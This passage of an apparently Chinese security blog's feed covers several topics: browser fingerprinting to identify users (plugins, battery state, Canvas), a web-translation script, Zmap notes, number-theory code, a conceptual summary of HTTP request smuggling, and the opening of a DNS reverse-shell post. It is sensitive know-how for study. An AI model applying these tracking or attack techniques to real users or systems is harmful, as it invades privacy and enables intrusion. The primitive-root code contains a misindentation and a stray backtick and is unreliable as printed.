&lt;p&gt;appName，浏览器名————“Netscape”&lt;/p&gt;
&lt;p&gt;appVersion，浏览器版本————“5.0 (Windows)”&lt;/p&gt;
&lt;p&gt;languages，浏览器语言————[“zh-CN”, “zh”, “en-US”, “en”]&lt;/p&gt;
&lt;p&gt;oscpu，系统CPU————“Windows NT 10.0; WOW64”&lt;/p&gt;
&lt;p&gt;userAgent，不用多说&lt;/p&gt;
&lt;p&gt;plugins[]，浏览器安装插件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里首先要说一下这一个参数，通过获取浏览器安装的插件，其实我们就可以判断出一部分用户所安装过的应用，尤其是杀毒软件、社交软件、支付软件等往往会安装相应的浏览器插件，那么通过这些信息的获取，就可以作为用户异度的另一个参数。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;getBattery()，当前电池参数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是我想说的另一个点，我们知道如果使用移动设备访问网站，那么一方面不同用户访问时的电池状态会存在差异性，另一方面在短时间内，同一用户的电池状态存在一定稳定性，甚至是一个连贯的变化过程，那么通过获取电池状态信息就可以辅助我们判断用户身份。&lt;/p&gt;
&lt;p&gt;一个简单的脑洞就是，构建相应的电池信息三元组，通过计算欧几里得距离来构建相关性图景。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;geolocation，地理位置获取&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个需要用户在浏览器同意定位，在没有一个完整的IP地理库时，这也是一种画像手段。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;more&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;除了以上列举出的部分函数外，一些基于移动设备的调用在某些特殊应用场合也可以来对用户身份进行识别。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.Canvas,你的个性绘图函数。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Cookie追踪手段是众所周知的用户画像手法，而另一种被广泛提到且有效的手段就是Canvas绘图指纹。&lt;/p&gt;
&lt;p&gt;Canvas作为HTML5中重要的绘图手段，被证实在绘制图形时，不同机器的不同浏览器对函数的实现都有略微的差别，而这种差异就可以很好的作为用户标记的手段。&lt;/p&gt;
&lt;p&gt;具体来龙去脉这篇文章讲的很清楚，而且已经有现成的JS实现，这里就不在多说。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/miyeah/p/3967494.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/miyeah/p/3967494.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x03-小DEMO&quot;&gt;&lt;a href=&quot;#0x03-小DEMO&quot; class=&quot;headerlink&quot; title=&quot;0x03 小DEMO&quot;&gt;&lt;/a&gt;0x03 小DEMO&lt;/h2&gt;&lt;p&gt;如果希望测试我上面提到的各种好玩的信息获取，可以访问以下地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://123.207.68.169/test.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;A little demo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不过，请注意，访问之前请充分考虑您对于隐私的顾虑，我能够做的保证是：&lt;/p&gt;
&lt;p&gt;一、不在我博客的网页中使用相应代码；&lt;/p&gt;
&lt;p&gt;二、demo中只是把信息回显到您的浏览器，不做任何信息收集保留；&lt;/p&gt;
&lt;p&gt;三、为了不被他人利用，DEMO中的代码经过了混淆。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;声明：郑重声明我不会在自己的博客页面里嵌入这里提到的任何代码。&lt;br&gt;
    
    </summary>
    
      <category term="Javascript" scheme="http://phantom0301.coding.me/categories/Javascript/"/>
    
    
      <category term="html5" scheme="http://phantom0301.coding.me/tags/html5/"/>
    
      <category term="javascript" scheme="http://phantom0301.coding.me/tags/javascript/"/>
    
      <category term="身份识别" scheme="http://phantom0301.coding.me/tags/%E8%BA%AB%E4%BB%BD%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>Python实现网页解析翻译</title>
    <link href="http://phantom0301.coding.me/2016/12/02/htmlparser/"/>
    <id>http://phantom0301.coding.me/2016/12/02/htmlparser/</id>
    <published>2016-12-02T10:32:34.000Z</published>
    <updated>2016-12-08T06:12:06.851Z</updated>
    
    <content type="html">&lt;p&gt;先不说主流的几款提供翻译接口的产品在翻译的水准上如何，就HTML标签识别来说，度娘恐怕没有谷歌和必应做的好。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-需求&quot;&gt;&lt;a href=&quot;#0x01-需求&quot; class=&quot;headerlink&quot; title=&quot;0x01 需求&quot;&gt;&lt;/a&gt;0x01 需求&lt;/h2&gt;&lt;p&gt;最近需要写程序翻译一批英文网页，要求翻译后的网页排版样式基本不变。经过前期测试发现，Google和Bing的在线翻译可以直接识别出HTML的标签：&lt;/p&gt;
&lt;p&gt;类似这样，看起来很舒心~~：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/qweasdwfdeqw20161202201213.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;换做度娘，Oh~：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/rhsrthser20161202201502.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;本以为是因为度娘没有做网页翻译插件的打算，所以没这个功能，但是查证后发现——其实百度是支持网页翻译的——也就是理论上应该可以识别网页标签，也许是我的姿势不对  (O.O)_?  求证大家的操作心得。&lt;/p&gt;
&lt;p&gt;总之，在正常的百度翻译API调用下无法实现很好的解析翻译网页，而能够实现这一功能的另两位也有客观上的难度，Google就不用说了，如果要调用就需要在程序上挂一个代理；那么，Bing这厮呢？要申请它的API过程太繁琐，一是大陆这边好像这项服务选项为空，另外通过其他手段拿到的好像也是试用key。最终，决定自己写个中间件，处理标签后送入百度，拿到翻译结果再重组标签。&lt;/p&gt;
&lt;h2 id=&quot;0x02-框架&quot;&gt;&lt;a href=&quot;#0x02-框架&quot; class=&quot;headerlink&quot; title=&quot;0x02 框架&quot;&gt;&lt;/a&gt;0x02 框架&lt;/h2&gt;&lt;p&gt;决定自己写处理程序后面临两种选择，一种是一个网页每对闭合标签调用一次API，另一种是一个网页一次性全部翻译后再分割。&lt;/p&gt;
&lt;p&gt;两种方法的不同之处在于，前者实现简单，但是每个网页多次调用API增加时间开销且浪费API调用次数，所以使用第二种方式实现。&lt;/p&gt;
&lt;p&gt;预期结构如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;读取网页 ——&amp;gt; 剔除标签，生成文本&amp;amp;标签数组 ——&amp;gt; 数组文本翻译
                                             |
                                            \ /
翻译完成  &amp;lt;—— 标签数组，文本数组组合  &amp;lt;—— 结果重分割数组
&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
&lt;li&gt;剔除标签，生成文本标签数组。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Python下有很多好用的HTML解析包，例如BS4，lxml，xpath等等，但是它们的封装都很高级，这里我只需要最简单的识别出标签和文本，所以使用代码更简单的HTMLParser来实现。&lt;/p&gt;
&lt;p&gt;HTMLParser是一个基于正则匹配的解析包，它写好了HTML的正则规则，提供了一个类给使用者继承，个人觉得包本身的核心是它的 &lt;em&gt;goahead&lt;/em&gt; 函数，利用这种步步识别的方法来解析HTML。&lt;/p&gt;
&lt;p&gt;继承的类中，重写了如下方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def handle_starttag(self, tag, attrs):
    attr = &amp;apos;&amp;apos;
    for i in attrs:
        attr = i[0]+&amp;apos;=&amp;apos;+i[1]  # 恢复标签属性值
    if attr == &amp;apos;&amp;apos;:
        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos;&amp;gt;&amp;apos;)
    else:
        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos; &amp;apos;+attr+&amp;apos;&amp;gt;&amp;apos;)
def handle_endtag(self, tag):
    self.parser_dic.append(&amp;apos;&amp;lt;/&amp;apos;+tag+&amp;apos;&amp;gt;&amp;apos;)
def handle_startendtag(self, tag, attrs):
    attr = &amp;apos;&amp;apos;
    for i in attrs:
        attr = i[0]+&amp;apos;=&amp;apos;+&amp;apos;&amp;quot;&amp;apos;+i[1]+&amp;apos;&amp;quot;&amp;apos;
    if attr == &amp;apos;&amp;apos;:
        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos;&amp;gt;&amp;apos;)
    else:
        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos; &amp;apos;+attr+&amp;apos;&amp;gt;&amp;apos;)
def handle_data(self, data):
    self.parser_dic.append(data)
def handle_comment(self, data):
    self.parser_dic.append(&amp;apos;&amp;lt;!-- --&amp;gt;&amp;apos;)
def handle_entityref(self, name):
    self.parser_dic.append(&amp;apos;&amp;amp;&amp;apos;+name+&amp;apos;;&amp;apos;)
def handle_charref(self, name):
    self.parser_dic.append(&amp;apos;&amp;amp;#&amp;apos;+name+&amp;apos;;&amp;apos;)
def output(self):
    return self.parser_dic
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过调用父类中的 &lt;em&gt;feed&lt;/em&gt; 方法来解析网页，解析结果输出成为一个按照顺序排列的标签和文本混合的数组。&lt;/p&gt;
&lt;p&gt;遍历数组，提取文本数组，遍历文本数组，添加分割符，组合成一个含有分隔符的文本。&lt;/p&gt;
&lt;p&gt;混合数组如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/dhdjdtj20161202211106.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;添加分割符如下：&lt;br&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20161202212045.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;2.数组翻译&lt;/p&gt;
&lt;p&gt;直接将含有分隔符的文本按照百度API调用规则发送，这个不需要多说。&lt;/p&gt;
&lt;p&gt;3.结果重分割&lt;/p&gt;
&lt;p&gt;使用文本自带的 &lt;em&gt;split&lt;/em&gt; 或者正则的对应函数分割之前的分隔符，形成文本数组&lt;/p&gt;
&lt;p&gt;4.标签重组&lt;/p&gt;
&lt;p&gt;这一部分就是重新遍历之前的标签文本混合数组，遇见非标签的内容，就用翻译后的文本数组替换，这样依次替换完成就可以实现保留标签的文本翻译。&lt;/p&gt;
&lt;h2 id=&quot;0x03-问题&quot;&gt;&lt;a href=&quot;#0x03-问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 问题&quot;&gt;&lt;/a&gt;0x03 问题&lt;/h2&gt;&lt;p&gt;实际操作绝大多数情况下是可行的。&lt;/p&gt;
&lt;p&gt;但是也有些问题，一是百度API一次翻译的字数有限，这就意味着，还需要做文本分割，而分割时又要考虑标签的完整性。二是分割符的选择，分隔符有时候也会引起翻译结果的混乱，初步测试使用“|”相对效果较好，后期可能使用多个分割符来防止分割符和文本本身符号混淆。&lt;/p&gt;
&lt;p&gt;最后放一张整个完成后的翻译效果图&lt;br&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20161202213133.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;先不说主流的几款提供翻译接口的产品在翻译的水准上如何，就HTML标签识别来说，度娘恐怕没有谷歌和必应做的好。&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://phantom0301.coding.me/categories/python/"/>
    
    
      <category term="htmlparser" scheme="http://phantom0301.coding.me/tags/htmlparser/"/>
    
      <category term="python" scheme="http://phantom0301.coding.me/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Zmap论文简读</title>
    <link href="http://phantom0301.coding.me/2016/10/27/Zmapread/"/>
    <id>http://phantom0301.coding.me/2016/10/27/Zmapread/</id>
    <published>2016-10-27T03:00:29.000Z</published>
    <updated>2016-10-27T03:36:19.940Z</updated>
    
    <content type="html">&lt;p&gt;很早之前就读到过其他大大使用Zmap做测试的文章，自己也玩了一下这个快速的扫描工具，但是一直对于它的认识处在黑盒的状态，所以这次浏览了一遍Zmap的论文，对于论文里面提到的点进行记录。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-诞生&quot;&gt;&lt;a href=&quot;#0x01-诞生&quot; class=&quot;headerlink&quot; title=&quot;0x01 诞生&quot;&gt;&lt;/a&gt;0x01 诞生&lt;/h2&gt;&lt;p&gt;一直以来，丈量日渐庞大的互联网就是研究者们的探索方向之一，和攻击者使用的探测手法，比如僵尸网络或者蠕虫相比，研究者能够利用的方法十分有限，于是，Zmap诞生了。&lt;/p&gt;
&lt;p&gt;在此之前，除了每一位致力于此的研究者自己编写的程序外，最有效的工具应该是Nmap，这已经是十分优秀的探测工具，但是它还是不够快，如果打算利用Nmap去扫描整个网络空间，花费的时间单位将以天计。&lt;/p&gt;
&lt;h2 id=&quot;0x02-性能&quot;&gt;&lt;a href=&quot;#0x02-性能&quot; class=&quot;headerlink&quot; title=&quot;0x02 性能&quot;&gt;&lt;/a&gt;0x02 性能&lt;/h2&gt;&lt;p&gt;官方给出的性能版本是：单台入门级服务器在千兆以太网速度下扫描整个IPv4空间需要45分钟。&lt;/p&gt;
&lt;p&gt;在同等准确度的限制下，它是使用agressive default策略的Nmap扫描速度的1300倍。&lt;/p&gt;
&lt;p&gt;Zmap能够将当前带宽的利用率提升到97%&lt;/p&gt;
&lt;h2 id=&quot;0x03-优化&quot;&gt;&lt;a href=&quot;#0x03-优化&quot; class=&quot;headerlink&quot; title=&quot;0x03 优化&quot;&gt;&lt;/a&gt;0x03 优化&lt;/h2&gt;&lt;p&gt;为了提高扫描速度，Zmap采用以下策略进行扫描探测优化：&lt;/p&gt;
&lt;p&gt;首先，Zmap跳过TCP/IP堆栈，直接在链路层使用以太网帧；&lt;br&gt;其次，对于目标列表的选取使用随机抽样，这样避免顺序扫描导致的对方网络负载过大。通过采用乘法循环群随机序列来保证生成稠密且唯一的随机数；&lt;br&gt;使用类似SYN cookies的方式来避免存储包交互时的序列状态确认；&lt;br&gt;使用根树，一种处理范围和使用频率的路由表来排除特殊的地址空间；&lt;br&gt;最后，在扫描过程中，允许丢失少量的扫描数据。&lt;/p&gt;
&lt;h2 id=&quot;0x04-验证&quot;&gt;&lt;a href=&quot;#0x04-验证&quot; class=&quot;headerlink&quot; title=&quot;0x04 验证&quot;&gt;&lt;/a&gt;0x04 验证&lt;/h2&gt;&lt;p&gt;通过实验对比，Zmap的命中率与扫描速度无关，同时对于探测的覆盖率和扫描时刻的影响进行的比较。&lt;/p&gt;
&lt;p&gt;在和Nmap的比较中我们可以看出，Nmap更适合单目标多端口的探测，而Zmap则侧重于多目标单端口的扫描环境。&lt;/p&gt;
&lt;h2 id=&quot;0x05-实际部署&quot;&gt;&lt;a href=&quot;#0x05-实际部署&quot; class=&quot;headerlink&quot; title=&quot;0x05 实际部署&quot;&gt;&lt;/a&gt;0x05 实际部署&lt;/h2&gt;&lt;p&gt;如果你是出于善意的角度使用Zmap去测量网络空间，在使用工具时，应该注意以下几点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;保持与网络管理员的联系，注意Zmap对当前的网络带宽环境带来的影响。&lt;/li&gt;
&lt;li&gt;在机器的源地址上放一个简单的网页声明，对于扫描源IP进行DNS解析，方便其他机构辨识。&lt;/li&gt;
&lt;li&gt;适当减缓扫描速度，使用灵活的扫描策略，降低可能的影响。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;0x06-发展&quot;&gt;&lt;a href=&quot;#0x06-发展&quot; class=&quot;headerlink&quot; title=&quot;0x06 发展&quot;&gt;&lt;/a&gt;0x06 发展&lt;/h2&gt;&lt;p&gt;这是论文里提到的未来Zmap的发展之路，不过这篇论文已经是3年前的了，其中提到的一些设想说不定已经实现。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;IPv6空间扫描&lt;/li&gt;
&lt;li&gt;单IP多域名多证书扫描&lt;/li&gt;
&lt;li&gt;类似robot的扫描圈君子协定&lt;/li&gt;
&lt;li&gt;更快的速度，甚至于实现建立某一时刻的网络地址空间快照&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;很早之前就读到过其他大大使用Zmap做测试的文章，自己也玩了一下这个快速的扫描工具，但是一直对于它的认识处在黑盒的状态，所以这次浏览了一遍Zmap的论文，对于论文里面提到的点进行记录。&lt;/p&gt;
    
    </summary>
    
      <category term="工具" scheme="http://phantom0301.coding.me/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Zmap" scheme="http://phantom0301.coding.me/tags/Zmap/"/>
    
      <category term="scanner" scheme="http://phantom0301.coding.me/tags/scanner/"/>
    
  </entry>
  
  <entry>
    <title>数论基础-原根与指标</title>
    <link href="http://phantom0301.coding.me/2016/10/15/primitiveroot/"/>
    <id>http://phantom0301.coding.me/2016/10/15/primitiveroot/</id>
    <published>2016-10-15T09:48:34.000Z</published>
    <updated>2016-12-08T06:19:34.754Z</updated>
    
    <content type="html">&lt;p&gt;数论基础部分有关于原根和指标的学习脑图。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;思维导图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/pic/ac1c3f15dcf2f7dc.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;三位数内的原根求解程序，如果验证有错，欢迎指出~~：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#! /usr/bin/env python
# -*- coding=UTF-8 -*-

def gcd(a, b):  # 求最大公约数
    while b != 0:
        (a,b) = (b, a%b)
    return a

def factorize(n, wheel=3):  # 因数分解
    if n &amp;lt; 2:
        return []
    primes = (2, 3, 5, 7, 11)
    if wheel &amp;lt; 2 or wheel &amp;gt; len(primes):
        wheel = 3
    primes = primes[:wheel]
    q = []
    for p in primes:
        if n % p != 0:
            continue
        e = 1
        n //= p
        while n % p == 0:
            n //= p
               e += 1
        q.append((p, e))
    if n &amp;gt; 1:
        m = reduce(lambda x, y:x*y, primes, 1)
        offs = [x for x in xrange(2, m + 1) if gcd(m, x) == 1] + [m + 1]
        k, done = 0, False
        while n &amp;gt; 1:
            for offset in offs:
                p = k + offset
                if p ** 2 &amp;gt; n:
                    done = True
                    break
                if n % p != 0:
                    continue
                e = 1
                n //= p
                while n % p == 0:
                    n //= p
                    e += 1
                q.append((p, e))
            if done:
                break
            k += m
        if n &amp;gt; 1:
            q.append((n, 1))
    return q

def Euler(n, wheel=3):  # 求欧拉函数
    &amp;apos;&amp;apos;&amp;apos; Euler Totient Function of n using a prime wheel criterion.
        It&amp;apos;s almost as fast as the phi(n, p) function &amp;apos;&amp;apos;&amp;apos;
    if n &amp;lt; 2:
        return n
    q = factorize(n, wheel)
    r = 1
    for (p, e) in q:
        r *= (p - 1) * (p ** (e - 1))
    return r

def primitive_root(mod):  # 求原根
    simple = []
    root = []
    phi_m = Euler(mod)
    for i in range(1,mod):
        if gcd(i, mod) == 1:
            simple.append(i)
    for a in simple:
        for j in range(1,phi_m+1):
            if a ** j % mod == 1:
                if j == phi_m:
                    root.append(a)
                else:
                    break

    return root

if __name__ == &amp;apos;__main__&amp;apos;:
    mod = raw_input(&amp;apos;Please input mod:&amp;apos;)
    print primitive_root(int(mod))`
&lt;/code&gt;&lt;/pre&gt;</content>
    
    <summary type="html">
    
      &lt;p&gt;数论基础部分有关于原根和指标的学习脑图。&lt;br&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.coding.me/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="原根" scheme="http://phantom0301.coding.me/tags/%E5%8E%9F%E6%A0%B9/"/>
    
      <category term="指标" scheme="http://phantom0301.coding.me/tags/%E6%8C%87%E6%A0%87/"/>
    
      <category term="数论" scheme="http://phantom0301.coding.me/tags/%E6%95%B0%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>没能复现的学习——DEFCON-HTTP-Smuggling</title>
    <link href="http://phantom0301.coding.me/2016/09/12/httpsmuggling/"/>
    <id>http://phantom0301.coding.me/2016/09/12/httpsmuggling/</id>
    <published>2016-09-12T12:44:03.000Z</published>
    <updated>2016-09-19T13:27:33.228Z</updated>
    
    <content type="html">&lt;p&gt;这篇文章主体框架来自@regilero在DEFCON上的议题-HTTP smuggling is a thing we should know better and care about.&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-闲扯Host-header&quot;&gt;&lt;a href=&quot;#0x00-闲扯Host-header&quot; class=&quot;headerlink&quot; title=&quot;0x00 闲扯Host header&quot;&gt;&lt;/a&gt;0x00 闲扯Host header&lt;/h2&gt;&lt;p&gt;作为重度网络依赖人群，我们每天都使用程序将数百次网页请求抛送到无形的网络空间中去，我们告知网络服务器我们要访问的资源，接受何种格式、何种语言的回应，是否要和服务器维持一段时间的连接，是否需要保存一些状态以及告知服务器你的代理发送人（浏览器或其他）身份。但是我们了解我们发送的这些东西的真正含义吗？&lt;/p&gt;
&lt;p&gt;其实作为一次网页请求，理论上我们只要告诉服务器我们要的资源url就可以。那么那些多余的键值大体起什么作用呢？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Accept族，这里的一系列字段决定了客户端接收的类型、压缩方式、字符集、语言等。这一类字段似乎是为了客户体验而产生的，它允许客户对自己喜欢的语言、字符集进行选择，并且提供选择因子“q”来界定对不同资源的喜好程度，q值越大越喜爱。而压缩则提供了更小的带宽占用和更快的访问速度。&lt;/li&gt;
&lt;li&gt;Cache-Control，缓存控制机制&lt;/li&gt;
&lt;li&gt;Connection,通常的参数会使用Keep-Alive，这个字段实际上算是对HTTP基础的补充，通过这个字段来使客户端到服务端的连接持续有效。而这个字段就是下面所描述问题的基础之一&lt;/li&gt;
&lt;li&gt;Cookie，用户体验与隐私、安全势不两立的存在，被广泛研究介绍，就不用多说了。&lt;/li&gt;
&lt;li&gt;User-Agent，这也是一个有意思的参数，它的存在最早是为了允许服务端差异化的提供页面，根据不同的框架提供不同的页面来适配不同的浏览器。最初，UA还是很单纯的，当时某些浏览器拥有了很好的显示效果，于是服务端检测到它们的时候就提供更好的页面，过了一段时间其他浏览器也有了相似的特性，为了也能够得到同样的页面，就会告诉浏览器自己和别人身份其实差不多，请给我优秀的页面，久而久之，大家的身份相互混来混去，于是大家都叫Mozilla了，然后又like上Gecko……就这样，UA不在那么单纯，浏览器们都充满了套路。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160905203128.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-HTTP-Pipeline&quot;&gt;&lt;a href=&quot;#0x01-HTTP-Pipeline&quot; class=&quot;headerlink&quot; title=&quot;0x01 HTTP Pipeline&quot;&gt;&lt;/a&gt;0x01 HTTP Pipeline&lt;/h2&gt;&lt;p&gt;HTTP管线化是作者提到的又一个漏洞基础，管线化使得多个HTTP请求不需要等待应答即可发送，使用这一技术的初衷是提高页面的载入性能，通过一个数据包来发送多个HTTP请求，也可以减轻网络负载压力。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160907214856.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这是在一次管线化测试中捕获的HTTP包，可以很清晰的看出在这一个TCP包中拥有三个HTTP包。作者把Pipelines称为大多数smuggling问题之源。在我们实际的使用过程中，实际上并没有真正用到这一技术，因为大多数的浏览器默认并不使用HTTP Pipeline。但是实际上根据文档说明，大多数的服务端都应该支持这一技术。&lt;/p&gt;
&lt;p&gt;对于Pipeline技术而言，虽然同时发出多个HTTP请求，但实际上它们还是有先后顺序的，而回应顺序与发送的先后顺序一致。&lt;/p&gt;
&lt;h2 id=&quot;0x02-HTTP-Smuggling-协议层面攻击&quot;&gt;&lt;a href=&quot;#0x02-HTTP-Smuggling-协议层面攻击&quot; class=&quot;headerlink&quot; title=&quot;0x02 HTTP Smuggling 协议层面攻击&quot;&gt;&lt;/a&gt;0x02 HTTP Smuggling 协议层面攻击&lt;/h2&gt;&lt;p&gt;前面说到了HTTP Smuggling的两个基础是Header中的keep-alive和pipelining技术，而产生矛盾就产生于客户端与服务器通信经过中间代理这样的结构。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;client——&amp;gt;middleware——&amp;gt;server
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当客户端和代理通信时会使用Pipeline，而代理和服务器通信会保持keep-alive但不会使用Pipeline，而服务端不会意识到这一点，这就会造成两次不一样的请求通过构造会被服务端认为是同一次请求。&lt;/p&gt;
&lt;p&gt;所以进行smuggling的过程就是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端发送一个Pipelining的包，里面包含一个有效包和若干无效的http包。&lt;/li&gt;
&lt;li&gt;请求包顺利通过中间件&lt;/li&gt;
&lt;li&gt;服务端解析分割了请求包&lt;/li&gt;
&lt;li&gt;由于错误，请求被服务端部分回应后，服务端认为Keep-alive依然连接，并且使用了Pipelining，于是等待下面的包。&lt;/li&gt;
&lt;li&gt;而下一个包就不一定是攻击者发送来的，但是作为服务端依然把这个包回应给了攻击者。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在这里，作者告诉我们其实早在2005年，就已经有人提到了这种利用手法，最终可以造成的效果包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个forbidden回复&lt;/li&gt;
&lt;li&gt;DOS掉一台过程中的机器&lt;/li&gt;
&lt;li&gt;缓存投毒&lt;/li&gt;
&lt;li&gt;劫持用户凭证&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来的是作者的Demo展示，可惜作者在这里使用go语言和Nodejs来编写中间件和服务端，并没能在本地环境复现作者的手法，这个只能等到以后回顾的时候再来复现了。&lt;/p&gt;
&lt;h2 id=&quot;0x03-期待的工具-HTTPWookiee&quot;&gt;&lt;a href=&quot;#0x03-期待的工具-HTTPWookiee&quot; class=&quot;headerlink&quot; title=&quot;0x03 期待的工具 HTTPWookiee&quot;&gt;&lt;/a&gt;0x03 期待的工具 HTTPWookiee&lt;/h2&gt;&lt;p&gt;作者在最后还许了一个愿，他会在考虑安全因素的条件下在Github上放出一个相关漏洞代理的自动化测试工具，不过已经过去一个月了吧。&lt;/p&gt;
&lt;p&gt;看作者的框图，这应该是一个通过发包、接受回应比对来判别代理漏洞利用的工具吧。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章主体框架来自@regilero在DEFCON上的议题-HTTP smuggling is a thing we should know better and care about.&lt;br&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.coding.me/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="DEFCON" scheme="http://phantom0301.coding.me/tags/DEFCON/"/>
    
      <category term="Smuggling" scheme="http://phantom0301.coding.me/tags/Smuggling/"/>
    
      <category term="http" scheme="http://phantom0301.coding.me/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>也说DNS反弹Shell</title>
    <link href="http://phantom0301.coding.me/2016/08/11/DNSshell/"/>
    <id>http://phantom0301.coding.me/2016/08/11/DNSshell/</id>
    <published>2016-08-11T12:03:39.000Z</published>
    <updated>2016-08-13T04:25:23.896Z</updated>
    
    <content type="html">&lt;p&gt;我们就是喜欢在正常的位置放进去一些奇怪的东西。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-引子&quot;&gt;&lt;a href=&quot;#0x01-引子&quot; class=&quot;headerlink&quot; title=&quot;0x01 引子&quot;&gt;&lt;/a&gt;0x01 引子&lt;/h2&gt;&lt;p&gt;反弹Shell广泛应用于远程控制下的权限维持，通过反转攻（客户端）和受（服务端）的角色，来实现条件限制，尤其是内网情况下的远程连接。&lt;/p&gt;
&lt;p&gt;反弹Shell的工具和实现方法多种多样，只要能够让被控端通过网络发送数据到控制端，并且实现数据的解析即可完成控制过程。&lt;/p&gt;
&lt;p&gt;最近在继续了解网络协议，于是突然想在DNS数据包中插入一些伪造的命令来实现解析，本来准备自己尝试写一个DNS服务器和DNS请求程序来实现反弹，不过刚动笔就看到了别人开源的程序，于是直接使用别人的程序来学习了。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ahhh/Reverse_DNS_Shell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ahhh/Reverse_DNS_Shell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;为了运行测试更方便，去掉了程序中的加解密功能，额外的Python包只需要dns和dnslib&lt;/p&gt;
&lt;h2 id=&quot;0x02-DNS&quot;&gt;&lt;a href=&quot;#0x02-DNS&quot; class=&quot;headerlink&quot; title=&quot;0x02 DNS&quot;&gt;&lt;/a&gt;0x02 DNS&lt;/h2&gt;&lt;p&gt;为了关联主机和IP地址对应关系而诞生的DNS本身，不需要我在这里赘述了。跳过域名构成、查询过程等可以轻松在网络查询到的内容，我们直接来看看DNS的包构成&lt;/p&gt;
